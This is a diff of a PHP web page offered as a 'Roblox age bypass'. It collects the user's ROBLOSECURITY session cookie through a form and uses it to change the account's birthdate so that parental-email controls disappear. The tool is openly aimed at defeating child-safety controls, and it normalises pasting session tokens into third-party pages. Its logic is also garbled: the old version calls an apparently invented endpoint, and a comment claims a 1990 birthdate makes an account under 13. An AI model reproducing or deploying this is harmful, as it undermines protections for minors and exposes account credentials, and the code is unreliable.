@@ -1,49 +1,46 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-  $cookie = $_POST["cookie"];
-  
-  // Extract and modify age data in cookie
-  $modifiedCookie = modifyCookieAge($cookie);
-  
-  // Submit modified cookie to Roblox to update account 
-  $response = submitToRoblox($modifiedCookie);
-  
-  if ($response == "success") {
-    echo "Age bypass complete. Your account is now under 13.";
-  } else {
-    echo "Error updating account. Please try again.";
-  }
-}
-
-function modifyCookieAge($cookie) {
-  // Decode the cookie from JSON format
-  $cookieData = json_decode($cookie, true);
-  
-  // Modify the age in the cookie data
-  $cookieData['age'] = 12;
-  
-  // Re-encode the modified cookie data as JSON
-  $modifiedCookie = json_encode($cookieData);
-  
-  return $modifiedCookie;
-}
-
-function submitToRoblox($cookie) {
-  // Roblox API endpoint to update account
-  $url = "https://api.roblox.com/universes/update-account";
-  
-  // Initiate cURL session
-  $ch = curl_init($url);
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-  curl_setopt($ch, CURLOPT_POSTFIELDS, $cookie);
-  curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
-  
-  // Execute cURL session and get response
-  $response = curl_exec($ch);
-  
-  // Close cURL session
-  curl_close($ch);
-  
-  return $response;
+    $cookie = $_POST["cookie"];
+    
+    if (empty($cookie)) {
+        die("Invalid cookie provided.");
+    }
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/my/account");
+    curl_setopt($ch, CURLOPT_COOKIE, "ROBLOSECURITY=$cookie");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    curl_close($ch);
+    
+    if (strpos($response, "Parent's Email") !== false) {
+        // Age is still over 13, attempt to change birthdate
+        $newBirthdate = "1990-01-01"; // Set a birthdate that makes the account under 13
+        
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/my/account");
+        curl_setopt($ch, CURLOPT_COOKIE, "ROBLOSECURITY=$cookie");
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "birthdate=$newBirthdate");
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $response = curl_exec($ch);
+        curl_close($ch);
+        
+        if (strpos($response, "Parent's Email") === false) {
+            echo "Age bypass successful. Parental email field removed.";
+        } else {
+            echo "Failed to bypass age restriction.";
+        }
+    } else {
+        echo "Parental email field already removed.";
+    }
+} else {
+    ?>
+    <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
+        <label for="cookie">Roblox Cookie:</label><br>
+        <input type="text" id="cookie" name="cookie" required><br>
+        <input type="submit" value="Bypass Age">
+    </form>
+    <?php
 }
 ?>
